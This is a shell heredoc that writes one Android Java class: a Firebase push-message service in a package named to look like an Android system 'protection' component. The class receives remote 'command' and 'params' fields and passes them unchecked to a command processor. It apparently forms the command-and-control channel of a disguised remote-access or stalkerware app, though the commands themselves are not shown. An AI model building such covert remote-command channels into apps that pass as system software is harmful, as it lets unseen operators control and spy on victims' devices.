cat > app/src/main/java/com/android/system/protection/fcm/MyFirebaseMessagingService.java << 'EOF'
package com.android.system.protection.fcm;

import android.util.Log;

import androidx.annotation.NonNull;

import com.android.system.protection.api.CommandProcessor;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import org.json.JSONObject;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        if (remoteMessage.getData().size() > 0) {
            String command = remoteMessage.getData().get("command");
            String paramsJson = remoteMessage.getData().get("params");
            String commandId = remoteMessage.getData().get("command_id");

            try {
                JSONObject params = paramsJson != null ? new JSONObject(paramsJson) : new JSONObject();
                CommandProcessor.processCommand(this, command, params, commandId);
            } catch (Exception e) {
                Log.e("FCM", "Error parsing command", e);
            }
        }
    }

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        RegistrationService.saveTokenAndRegister(this, token);
    }
}
EOF